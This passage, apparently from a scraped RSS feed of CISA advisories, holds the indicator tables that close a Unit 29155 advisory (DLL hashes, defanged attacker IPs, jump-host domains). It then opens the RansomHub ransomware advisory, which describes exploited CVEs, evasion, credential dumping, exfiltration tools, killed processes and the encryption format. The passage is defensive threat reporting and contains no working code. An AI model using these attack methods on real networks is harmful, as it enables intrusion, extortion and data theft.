<td>Nykfvwmchighqwcguabvgq.dll</td>
<td>8a2ba7f9cb6f65edf65dbe579907551e</td>
<td>673586594242d99ab02118595e457297</td>
</tr>
<tr>
<td>Ofgdwttnmqibnmpqx.dll</td>
<td>9657c2ef6ed5229740b125df9ca6c915</td>
<td>0dc5ac12f7690db15c99eaabc11b129c</td>
</tr>
<tr>
<td>Ohtvepefcjnchrrasokn.dll</td>
<td>a5494ffd9efb7c3df59c527076a05e62</td>
<td>e2cc52273d56ed66c800a726760c1ed0</td>
</tr>
<tr>
<td>Olkscszculdbzvco.dll</td>
<td>85afdef18d65b0518d709a5a324ea57a</td>
<td>77675a24040f10c85112d9a219d5f1c7</td>
</tr>
<tr>
<td>Onkwzkpfuqazvali.dll</td>
<td>da4d81f9ef3b25ea09f34481d923dd9d</td>
<td>cc4a9db6f250114e26d8d9ba6ab46bc9</td>
</tr>
<tr>
<td>Opaqwrazeyyilbbjlkf.dll</td>
<td>0e6374042b33d78329149a6189a7cb46</td>
<td>1934e2ebc64d41e37ef53ea0c075e974</td>
</tr>
<tr>
<td>Owxtabfdqhkaahhwsgkatuu.dll</td>
<td>d33f608f561096be24cba91797e0da2f</td>
<td>332b7f6662e28e3577bd1b269904b940</td>
</tr>
<tr>
<td>Poezcjhvkzgmnyqljpbte.dll</td>
<td>32db8abce1618e60441f5c7cf4be0d22</td>
<td>2b2509c6ee46d6327f2f1c9a75122d15</td>
</tr>
<tr>
<td>Rvyqctymumtudroyae.dll</td>
<td>dd2431b1f858b4ca14a4ea05fb8c4a06</td>
<td>9b2924c727aa3a061906321a66c9050c</td>
</tr>
<tr>
<td>Sutragevr.dll</td>
<td>7d3b529db1bd896d9fd877b85cafdc64</td>
<td>de276cf07ccffa18d7ffc35281bca910</td>
</tr>
<tr>
<td>Sxkdxclqmxnmjgedhgagl.dll</td>
<td>6e1394938c2fecad2d4f5b3bcf357ec0</td>
<td>d6b41747cb035c4c2b08790cd57f0626</td>
</tr>
<tr>
<td>Tosyxesxgrzyb.dll</td>
<td>99305ce01cc2d0f58cd226efb2de893f</td>
<td>6859fe5a3eead00a563cd93efcc6ea96</td>
</tr>
<tr>
<td>Tpmnkauftdydomyz.dll</td>
<td>6c152774f6894407075e6f0a2859bbae</td>
<td>981160dee6cd25fb181e54eca7ff7c22</td>
</tr>
<tr>
<td>Tptjtwfhpsjfksqoajt.dll</td>
<td>343b140977b3f9b227e7e5f82b0fadb5</td>
<td>95cf2a5a24b0d33d621bb8995d5826bc</td>
</tr>
<tr>
<td>Tsgblplhdwwj.dll</td>
<td>54a9fa9eb337a3b5ca7b0fa4553e439d</td>
<td>cee5acbfef7e76f52f40b8ae95199c50</td>
</tr>
<tr>
<td>Uqhznlcagzyoqrbyylnnwn.dll</td>
<td>4c19aeecbfca13b8a199703d8b8284b9</td>
<td>ad0ca738aa6c987e4ee1a87ff2b8acd5</td>
</tr>
<tr>
<td>Uslrfkxccdyetfdxmaokbhv.dll</td>
<td>dc795cb9290b1bc0b7fb1ce9d6ae7c93</td>
<td>552d9b79cc544fc6c3e8aa204dd00811</td>
</tr>
<tr>
<td>Waordspinycera.dll</td>
<td>9935a86108e3ae3f72cd15817601dcc6</td>
<td>5d063eecd894d3d523875bc82ef6f319</td>
</tr>
<tr>
<td>Wcfsobntsczz.dll</td>
<td>77aa3f342a0d69fda67c853bcc004d48</td>
<td>d0b00a6c83ce810ec2763af17e8ab1c4</td>
</tr>
<tr>
<td>Wpqyhvfnunlabx.dll</td>
<td>03af632aa6f87bf9dd4364ee3b612cbb</td>
<td>9f11e915be5c0d02a3130329cf032a28</td>
</tr>
<tr>
<td>Wqwpawlulyrsrjcbvuvddeud.dll</td>
<td>41871fef433d7b4b89fd226fe3a1a2c0</td>
<td>e21fe98cc8866c0eeecf3549ebcec751</td>
</tr>
<tr>
<td>Wqxpgvsgvhygmfbziucxcuh.dll</td>
<td>246d9f9831b125ea7e6ef21bc4c8a0ca</td>
<td>dea3ae8225913dd98148fc86cfc3bcbe</td>
</tr>
<tr>
<td>Xgcpgrxhchgwz.dll</td>
<td>9c695be3703194fdb71c212a0832bcf3</td>
<td>8744cec7547b1e73705c10a264e28e08</td>
</tr>
<tr>
<td>Xgkepoc.dll</td>
<td>69e58c5ee69f5e5e8a58f4afdd59adfe</td>
<td>d43446b4a22a597b93b559821ee5ac9b</td>
</tr>
<tr>
<td>Xlfthpiq.dll</td>
<td>540ee8e39150c539fea582b0e77be7b0</td>
<td>3fe96ff4a5ef0f5346ce645a2a893597</td>
</tr>
<tr>
<td>Xlocky.dll</td>
<td>0a2affa6d895baab087b84e93145da35</td>
<td>246f31c86bbbe7f65c0126cf4a1a947a</td>
</tr>
<tr>
<td>Xqblktvxmnxrzwiuqdfxzrd.dll</td>
<td>569c1d31f4c7ec7701d8e4e51b59fe85</td>
<td>5eaa7e812733a5c8cda734fab2f752d5</td>
</tr>
<tr>
<td>Xykqrksoqqgyuckfc.dll</td>
<td>09a2d85e809d36bff82bd5ab773980a3</td>
<td>96964aed18f65a7acae632f358a093f6</td>
</tr>
<tr>
<td>Yawyjonk.dll</td>
<td>3ccf799ff208981349cee4fb1a1cf88c</td>
<td>4e9c55c6fe25d61ca4394de794546fab</td>
</tr>
<tr>
<td>Yrknbt.dll</td>
<td>6154760e602bd71192d93f72fbdb486e</td>
<td>94bf96b76c2a092de8962496ce35deaf</td>
</tr>
<tr>
<td>Yvbmuigfihprdxgiirp.dll</td>
<td>b0d0a23766fa64ece9315f37b28bb4c0</td>
<td>1e22d64f263e8ea4b2d37dcd9b7c3012</td>
</tr>
<tr>
<td>Ywrovtjimixpmizuln.dll</td>
<td>ca43a241042b5fcc305393765ae18e69</td>
<td>28d571ddb5c04d065dfe1be9604663ba</td>
</tr>
<tr>
<td>Zfgdccnwnee.dll</td>
<td>251f3a4757d9e4de0499cc30c0bc00a9</td>
<td>755dac7edd17fbf5b5c449dd06c02e14</td>
</tr>
<tr>
<td>Zkuxhxwbvifejn.dll</td>
<td>9d7ab8b0aa669125d9a5adc4f46c56f3</td>
<td>af277ae0fbf6cc20f887696ea4756d46</td>
</tr>
<tr>
<td>Zsdflpivel.dll</td>
<td>a9c9c0be8eca3b575c24da0fcf1af1a9</td>
<td>1cac5c0cb8801e8730447023270d8d56</td>
</tr>
</tbody>
</table>
</div>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p><strong>Table 27</strong> lists observed IP addresses that were first observed as early as 2022 and have been historically linked to Unit 29155 infrastructure. These IPs are considered historical infrastructure and should be investigated for associated abnormal or malicious activity.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 27: IP Addresses Associated with Unit 29155 Infrastructure</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>5.226.139[.]66</td>
</tr>
<tr>
<td>45.141.87[.]11</td>
</tr>
<tr>
<td>46.101.242[.]222</td>
</tr>
<tr>
<td>62.173.140[.]223</td>
</tr>
<tr>
<td>79.124.8[.]66</td>
</tr>
<tr>
<td>90.131.156[.]107</td>
</tr>
<tr>
<td>112.51.253[.]153</td>
</tr>
<tr>
<td>112.132.218[.]45</td>
</tr>
<tr>
<td>154.21.20[.]82</td>
</tr>
<tr>
<td>179.43.133[.]202</td>
</tr>
<tr>
<td>179.43.142[.]42</td>
</tr>
<tr>
<td>179.43.162[.]55</td>
</tr>
<tr>
<td>179.43.175[.]38</td>
</tr>
<tr>
<td>179.43.175[.]108 (data exfiltration site)</td>
</tr>
<tr>
<td><a>179.43.176[.]60</a></td>
</tr>
<tr>
<td>179.43.187[.]47</td>
</tr>
<tr>
<td>179.43.189[.]218</td>
</tr>
<tr>
<td>185.245.84[.]227</td>
</tr>
<tr>
<td>185.245.85[.]251</td>
</tr>
<tr>
<td>194.26.29[.]84</td>
</tr>
<tr>
<td>194.26.29[.]95</td>
</tr>
<tr>
<td>194.26.29[.]98</td>
</tr>
<tr>
<td>194.26.29[.]251</td>
</tr>
</tbody>
</table>
<p>Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network. In this context, the domains listed in <strong>Table 28</strong> represent the tools used to establish functionality for creating a jump host.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 28: Domains Hosting Jump Host Tooling</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Domain Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>interlinks[.]top</td>
</tr>
<tr>
<td>https://3proxy[.]ru</td>
</tr>
<tr>
<td>https://ngrok[.]com (<strong>Note:</strong> This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)</td>
</tr>
<tr>
<td>https://nssm[.]cc</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Wed, 04 Sep 2024 15:01:58 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22132"))) ("#StopRansomware: RansomHub Ransomware" "<h2><strong>Summary</strong></h2>
<p><em><strong>Note:</strong> This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\" title=\"#StopRansomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Multi-State Information Sharing and Analysis Center (MS-ISAC), and the Department of Health and Human Services (HHS) (hereafter referred to as the authoring organizations)&nbsp;are releasing this joint advisory to disseminate known RansomHub ransomware IOCs and TTPs. These have been identified through FBI threat response activities and third-party reporting as recently as August 2024. RansomHub is a ransomware-as-a-service variant—formerly known as Cyclops and Knight—that has established itself as an efficient and successful service model (recently attracting high-profile affiliates from other prominent variants such as LockBit and ALPHV).</p>
<p>Since its inception in February 2024, RansomHub has encrypted and exfiltrated data from at least 210 victims representing the water and wastewater, information technology, government services and facilities, healthcare and public health, emergency services, food and agriculture, financial services, commercial facilities, critical manufacturing, transportation, and communications critical infrastructure sectors.</p>
<p>The affiliates leverage a double-extortion model by encrypting systems and exfiltrating&nbsp;data to extort victims. It should be noted that data exfiltration methods are dependent on the affiliate conducting the network compromise. The ransom note dropped during encryption does not generally include an initial ransom demand or payment instructions. Instead, the note provides victims with a client ID and instructs them to contact the ransomware group via a unique <code>.onion</code> URL (reachable through the Tor browser). The ransom note typically gives victims between three and 90 days to pay the ransom (depending on the affiliate) before the ransomware group publishes their data on the RansomHub Tor data leak site.</p>
<p>The authoring organizations encourage network defenders to implement the recommendations in the&nbsp;<strong>Mitigations</strong> section of this cybersecurity advisory to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-242a-stopransomware-ransomhub-ransomware_1.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-242A #StopRansomware: RansomHub Ransomware</a>
    <span class=\"c-file__size\">(PDF,       825.67 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX XML</a>
    <span class=\"c-file__size\">(XML,       133.74 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/AA24-242A-StopRansomware-RansomHub-Ransomware.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-242A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       109.41 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK<sup>®</sup> Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>Initial Access</h3>
<p>RansomHub affiliates typically compromise internet facing systems and user endpoints by using methods such as phishing emails [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1566/\" title=\"Phishing\">T1566</a>], exploitation of known vulnerabilities [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>], and password spraying [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>]. Password spraying targets accounts compromised through data breaches. Proof-of-concept exploits are obtained from sources such as ExploitDB and GitHub [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a>]. Exploits based on the following CVEs have been observed:</p>
<ul>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-3519\" title=\"CVE-2023-3519\">CVE-2023-3519</a> (<a href=\"https://www.cvedetails.com/cwe-details/94/Improper-Control-of-Generation-of-Code-Code-Injection-.html\" title=\"CWE-94 : Improper Control of Generation of Code ('Code Injection')\">CWE-94</a>)
<ul>
<li>Citrix ADC (NetScaler) Remote Code Execution. A vulnerability exists within Citrix ADC that allows an unauthenticated attacker to trigger a stack buffer overflow of the NSPPE (NetScaler Packet Processing Engine) process by making a specially crafted HTTP GET request. Successful exploitation results in remote code execution as root.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-27997\" title=\"CVE-2023-27997\">CVE-2023-27997</a> (<a href=\"https://www.cvedetails.com/cwe-details/787/Out-of-bounds-Write.html\" title=\"CWE-787 : Out-of-bounds Write\">CWE-787</a> | <a href=\"https://www.cvedetails.com/cwe-details/122/Heap-based-Buffer-Overflow.html\" title=\"CWE-122 : Heap-based Buffer Overflow\">CWE-122</a>)
<ul>
<li>A heap-based buffer overflow vulnerability in FortiOS version 7.2.4 and below, version 7.0.11 and below, version 6.4.12 and below, version 6.0.16 and below and FortiProxy version 7.2.3 and below, version 7.0.9 and below, version 2.0.12 and below, version 1.2 all versions, version 1.1 all versions SSL-VPN may allow a remote attacker to execute arbitrary code or commands via specifically crafted requests.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46604\" title=\"CVE-2023-46604\">CVE-2023-46604</a> (<a href=\"https://www.cvedetails.com/cwe-details/502/Deserialization-of-Untrusted-Data.html\" title=\"CWE-502 : Deserialization of Untrusted Data\">CWE-502</a>)
<ul>
<li>The Java OpenWire protocol marshaller, such as in Apache ActiveMQ, is vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to open either a Java-based OpenWire broker or client to run arbitrary shell commands by manipulating serialized class types in the OpenWire protocol to cause either the client or the broker (respectively) to instantiate any class on the classpath. Upgrading both brokers and clients to version 5.15.16, 5.16.7, 5.17.6, or 5.18.3 fixes this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-22515\" title=\"CVE-2023-22515\">CVE-2023-22515</a>
<ul>
<li>A vulnerability in publicly accessible Confluence Data Center and Server instances that allows the creation of unauthorized Confluence administrator accounts and access to Confluence instances. Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-46747\" title=\"CVE-2023-46747\">CVE-2023-46747</a> (<a href=\"https://www.cvedetails.com/cwe-details/306/Missing-Authentication-for-Critical-Function.html\" title=\"CWE-306 : Missing Authentication for Critical Function\">CWE-306</a> | <a href=\"https://www.cvedetails.com/cwe-details/288/Authentication-Bypass-Using-an-Alternate-Path-or-Channel.html\" title=\"CWE-288 : Authentication Bypass Using an Alternate Path or Channel\">CWE-288</a>)
<ul>
<li>Undisclosed requests may bypass configuration utility authentication, allowing an attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands. <strong>Note:</strong> Software versions which have reached End of Technical Support (EoTS) are not evaluated.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-48788\" title=\"CVE-2023-48788\">CVE-2023-48788</a> (<a href=\"https://www.cvedetails.com/cwe-details/89/Improper-Neutralization-of-Special-Elements-used-in-an-SQL-C.html\" title=\"CWE-89 : Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\">CWE-89</a>)
<ul>
<li>An improper neutralization of special elements used in an SQL command (SQL injection') in Fortinet FortiClientEMS version 7.2.0 through 7.2.2 and FortiClientEMS 7.0.1 through 7.0.10 allows attacker to execute unauthorized code or commands via specially crafted packets.</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2017-0144\" title=\"CVE-2017-0144\">CVE-2017-0144</a>
<ul>
<li>The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, also known as “Windows SMB Remote Code Execution Vulnerability” [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1210/\">T1210</a>].</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-1472\" title=\"CVE-2020-1472\">CVE-2020-1472</a>
<ul>
<li>An elevation of privilege vulnerability exists when an attacker establishes a vulnerable Netlogon secure channel connection to a domain controller using the Netlogon Remote Protocol (MS-NRPC).</li>
</ul>
</li>
<li><a href=\"https://www.cve.org/CVERecord?id=CVE-2020-0787\" title=\"CVE-2020-0787\">CVE-2020-0787</a>
<ul>
<li>This vulnerability was also potentially exploited along with the Zerologon privilege escalation vulnerability.</li>
</ul>
</li>
</ul>
<h3>Discovery</h3>
<p>RansomHub affiliates conduct network scanning with tools such as AngryIPScanner, Nmap, and PowerShell-based living off the land methods with PowerShell to conduct network scanning [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1018/\" title=\"Remote System Discovery\">T1018</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>][<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>].</p>
<h3>Defense Evasion</h3>
<p>Cybersecurity researchers have observed affiliates renaming the ransomware executable with innocuous file names, such as <code>Windows.exe</code>, left on the user’s desktop (<code>C:\\Users\\%USERNAME%\\Desktop</code>) or downloads (<code>C:\\Users\\%USERNAME%\\Downloads</code>) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1036/\" title=\"Masquerading\">T1036</a>]. The affiliates have also cleared Windows and Linux system logs to inhibit any potential incident response [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1070/\" title=\"Indicator Removal\">T1070</a>]. Affiliates used Windows Management Instrumentation [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1047/\" title=\"Windows Management Instrumentation\">T1047</a>] to disable antivirus products. In some instances, RansomHub-specific tools were deployed to disable endpoint detection and response (EDR) tooling [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a>].</p>
<h3>Privilege Escalation and Lateral Movement</h3>
<p>Following initial access, RansomHub affiliates created user accounts for persistence [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1136/\" title=\"Create Account\">T1136</a>], reenabled disabled accounts [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/\" title=\"Account Manipulation\">T1098</a>], and used Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>] on Windows systems to gather credentials [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>] and escalate privileges to SYSTEM [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a>]. Affiliates then moved laterally inside the network through methods including Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1021/001/\" title=\"Remote Services: Remote Desktop Protocol\">T1021.001</a>], PsExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PsExec\">S0029</a>], Anydesk [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\" title=\"Remote Access Software\">T1219</a>], Connectwise, N-Able, Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>], Metasploit, or other widely used command-and-control (C2) methods.</p>
<h3>Data Exfiltration</h3>
<p>Data exfiltration methods depend heavily on the affiliate conducting the network compromise. The ransomware binary does not normally include any mechanism for data exfiltration. Data exfiltration has been observed through the usage of tools such as PuTTY [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/002/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\">T1048.002</a>], Amazon AWS S3 buckets/tools [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1537/\" title=\"Transfer Data to Cloud Account\">T1537</a>], HTTP POST requests [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1048/003/\" title=\"Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol\">T1048.003</a>], WinSCP, Rclone, Cobalt Strike, Metasploit, and other methods.</p>
<h3>Encryption</h3>
<p>RansomHub ransomware has typically leveraged an Elliptic Curve Encryption algorithm called Curve 25519 to encrypt user accessible files on the system [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1486/\" title=\"Data Encrypted for Impact\">T1486</a>]. Curve 25519 uses a public/private key that is unique to each victim organization. To successfully encrypt files that are currently in use, the ransomware binary will typically attempt to stop the following processes:</p>
<ul>
<li><em>\"vmms.exe\"</em></li>
<li><em>\"msaccess.exe\"</em></li>
<li><em>\"mspub.exe\"</em></li>
<li><em>\"svchost.exe\"</em></li>
<li><em>\"vmcompute.exe\"</em></li>
<li><em>\"notepad.exe\"</em></li>
<li><em>\"ocautoupds.exe\"</em></li>
<li><em>\"ocomm.exe\"</em></li>
<li><em>\"ocssd.exe\"</em></li>
<li><em>\"oracle.exe\"</em></li>
<li><em>\"onenote.exe\"</em></li>
<li><em>\"outlook.exe\"</em></li>
<li><em>\"powerpnt.exe\"</em></li>
<li><em>\"explorer.exe\"</em></li>
<li><em>\"sql.exe\"</em></li>
<li><em>\"steam.exe\"</em></li>
<li><em>\"synctime.exe\"</em></li>
<li><em>\"vmwp.exe\"</em></li>
<li><em>\"thebat.exe\"</em></li>
<li><em>\"thunderbird.exe\"</em></li>
<li><em>\"visio.exe\"</em></li>
<li><em>\"winword.exe\"</em></li>
<li><em>\"wordpad.exe\"</em></li>
<li><em>\"xfssvccon.exe\"</em></li>
<li><em>\"TeamViewer.exe\"</em></li>
<li><em>\"agntsvc.exe\"</em></li>
<li><em>\"dbsnmp.exe\"</em></li>
<li><em>\"dbeng50.exe\"</em></li>
<li><em>\"encsvc.exe\"</em></li>
</ul>
<p>The ransomware binary will attempt to encrypt any files that the user has access to, including user files and networked shares.</p>
<p>RansomHub implements intermittent encryption, encrypting files in 0x100000 byte chunks and skipping every 0x200000 bytes of data in between encrypted chunks. Files smaller than 0x100000 bytes in size are completely encrypted. Files are appended with 58 (0x3A) bytes of data at the end. This data contains a value which is likely part of an encryption/decryption key. The structure of the appended 0x3A bytes is listed below with images from three different encrypted files.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%201%20-%20The%20first%20eight%20bytes.png?itok=7KCmOV_-\" width=\"496\" height=\"116\" alt=\"Figure 1 - The first eight bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 1: The first eight bytes are the size of the encrypted file.</em></figcaption>
  </figure>
<p>The next eight bytes are the size of encrypted blocks. If the entire file is encrypted, this section is all zeros. In this example, each encrypted section is 0x100000 bytes long, with 0x100000 bytes between each encrypted block. This number was observed changing based on the size of the encrypted file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%202%20-%20The%20size%20of%20encrypted%20blocks.png?itok=59AF45Sy\" width=\"496\" height=\"85\" alt=\"Figure 2 - The size of encrypted blocks\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 2: The size of encrypted blocks.</em></figcaption>
  </figure>
<p>The next two bytes were always seen to be 0x0001.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%203%20-%20The%20next%20two%20bytes.png?itok=M7DpLyKf\" width=\"494\" height=\"100\" alt=\"Figure 3 - The next two bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 3: The next two bytes are always 0x0001.</em></figcaption>
  </figure>
<p>The next 32 bytes are the public encryption key for the file.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%204%20-%20Public%20encryption%20key.png?itok=V09lNet1\" width=\"493\" height=\"94\" alt=\"Figure 4 - Public encryption key\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 4: Public encryption key for the file.</em></figcaption>
  </figure>
<p>The next four bytes are a checksum value.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%205%20-%20Checksum%20value.png?itok=27hZrM7n\" width=\"498\" height=\"83\" alt=\"Figure 5 - Checksum value\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 5: Checksum value.</em></figcaption>
  </figure>
<p>The last four bytes are always seen to be the sequence 0x00ABCDEF.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-08/Figure%206%20-%20The%20last%20four%20bytes.png?itok=cT5kmoKF\" width=\"495\" height=\"82\" alt=\"Figure 6 - The last four bytes\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 6: The last four bytes.</em></figcaption>
  </figure>
<p>The ransomware executable does not typically encrypt executable files.&nbsp;A random file extension is added to file names and a ransom note generally titled <code>How To Restore Your Files.txt</code> is left on the compromised system. To further inhibit system recovery, the ransomware executable typically leverages the <code>vssadmin.exe</code> program to delete volume shadow copies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1490/\" title=\"Inhibit System Recovery\">T1490</a>].</p>
<h3>Leveraged Tools</h3>
<p>See <strong>Table 1</strong> for publicly available tools and applications used by RansomHub affiliates. This includes legitimate tools repurposed for their operations.</p>
<p><strong>Disclaimer:</strong> Use of these tools and applications should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Tools Used by RansomHub Affiliates</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Tool Name</strong></th>
<th role=\"columnheader\"><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>BITSAdmin</td>
<td>A command-line utility that manages downloads/uploads between a client and server by using the Background Intelligent Transfer Service (BITS) to perform asynchronous file transfers.</td>
</tr>
<tr>
<td>Cobalt Strike [<a href=\"https://attack.mitre.org/versions/v15/software/S0154/\" title=\"Cobalt Strike\">S0154</a>]</td>
<td>A penetration testing tool used by security professionals to test the security of networks and systems. RansomHub affiliates have used it to assist with lateral movement and file execution.</td>
</tr>
<tr>
<td>Mimikatz [<a href=\"https://attack.mitre.org/versions/v15/software/S0002/\" title=\"Mimikatz\">S0002</a>]</td>
<td>A tool that allows users to view and save authentication credentials such as Kerberos tickets. RansomHub affiliates have used it to aid privilege escalation.</td>
</tr>
<tr>
<td>PSExec [<a href=\"https://attack.mitre.org/versions/v15/software/S0029/\" title=\"PSExec\">S0029</a>]</td>
<td>A tool designed to run programs and execute commands on remote systems.</td>
</tr>
<tr>
<td>PowerShell</td>
<td>Cross-platform task automation solution made up of a command line shell, a scripting language, and a configuration management framework, which runs on Windows, Linux, and macOS.</td>
</tr>
<tr>
<td>RClone</td>
<td>A command line program used to sync files with cloud storage services.</td>
</tr>
<tr>
<td>Sliver</td>
<td>A penetration testing toolset which allows for remote command and control of systems.</td>
</tr>
<tr>
<td>SMBExec</td>
<td>A tool designed to manipulate SMB services for remote code execution.</td>
</tr>
<tr>
<td>WinSCP</td>
<td>Windows Secure Copy is a free and open source SSH File Transfer Protocol, File Transfer Protocol, WebDAV, Amazon S3, and secure copy protocol client. Affiliates have used it to transfer data from a compromised network to actor-controlled accounts.</td>
</tr>
<tr>
<td>CrackMapExec</td>
<td>Pentest Toolset</td>
</tr>
<tr>
